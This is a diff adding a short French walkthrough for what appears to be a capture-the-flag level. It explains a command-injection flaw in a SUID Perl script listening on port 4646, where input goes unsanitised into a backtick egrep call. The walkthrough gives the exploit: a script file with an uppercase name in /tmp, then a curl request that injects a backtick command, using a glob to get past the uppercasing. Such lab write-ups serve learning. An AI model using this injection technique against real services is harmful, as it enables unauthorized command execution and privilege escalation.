@@ -1,0 +1,18 @@
+on voit un script perl toujours avec les droits SUID, il utilise le port 4646.
+
+on voit que la Current String $_ est stockée dans la variable $xx. Le script utilise 2 regexp sur la variable $xx:
+$xx =~ tr/a-z/A-Z/;  //qui transforme a -> A et ainsi de suite
+$xx =~ s/\s.*//; // substitue n'importe quels (.) whitespaces (\s) qu'il y en est 0 ou plus (*) par "" (rien)
+
+
+@output = `egrep "^$xx" /tmp/xd 2>&1`;
+on voit aussi que l'Output est entre backquote, donc ce qu'il y en dans l'Output sera executer et $xx est dedans.
+on va donc faire en sorte que $xx nous donne le flag.
+
+on va creer un fichier dans /tmp avec un nom en majuscule et sans whitespace qui contient la commande `getflag`
+
+-> touch /tmp/PROUT ; chmod 777 /tmp/PROUT ; touch /tmp/flag ; chmod 666 /tmp/flag ; echo "getflag > /tmp/flag" > /tmp/PROUT
+
+on peut donc executer `curl localhost:4646/?x='/tmp/PROUT'` mais $xx est sensible a la casse donc on remplace le /tmp par /*:
+
+-> curl localhost:4646/?x='`/*/PROUT`' ; cat /tmp/flag
